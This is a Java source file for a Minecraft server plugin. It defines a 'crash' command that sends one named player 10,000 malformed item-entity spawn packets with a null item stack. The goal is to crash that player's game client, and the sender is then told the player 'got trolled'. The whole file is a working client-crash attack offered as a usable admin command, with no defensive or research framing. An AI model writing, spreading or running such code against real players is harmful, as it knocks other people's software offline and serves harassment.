package dev.isnow.fox.command.impl;

import dev.isnow.fox.command.CommandInfo;
import dev.isnow.fox.command.FoxCommand;
import dev.isnow.fox.util.ColorUtil;
import net.minecraft.server.v1_8_R3.EntityItem;
import net.minecraft.server.v1_8_R3.PacketPlayOutSpawnEntity;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.craftbukkit.v1_8_R3.CraftWorld;
import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
import org.bukkit.entity.Player;

@CommandInfo(name = "crash", syntax = "<player>", purpose = "Crashes player's client.")
public class Crash extends FoxCommand {
    @Override
    protected boolean handle(CommandSender sender, Command command, String label, String[] args) {
        if(args.length == 2) {
            Player p = Bukkit.getPlayer(args[1]);
            if(p == null) {
                sender.sendMessage(ColorUtil.translate("&cThis player does not exist!"));
                return true;
            }
            for(int ia = 0; ia < 10000; ia++) {
                EntityItem spawned = new EntityItem(((CraftWorld)p.getWorld()).getHandle());
                spawned.setLocation(p.getLocation().getX(), p.getLocation().getY(), p.getLocation().getZ(), 0, 0);
                spawned.setItemStack(null);
                PacketPlayOutSpawnEntity packet_item = new PacketPlayOutSpawnEntity(spawned, 2);
                ((CraftPlayer)p).getHandle().playerConnection.sendPacket(packet_item);
            }
            sender.sendMessage(ColorUtil.translate("&cPlayer got trolled!"));
            return true;
        }
        return false;
    }
}
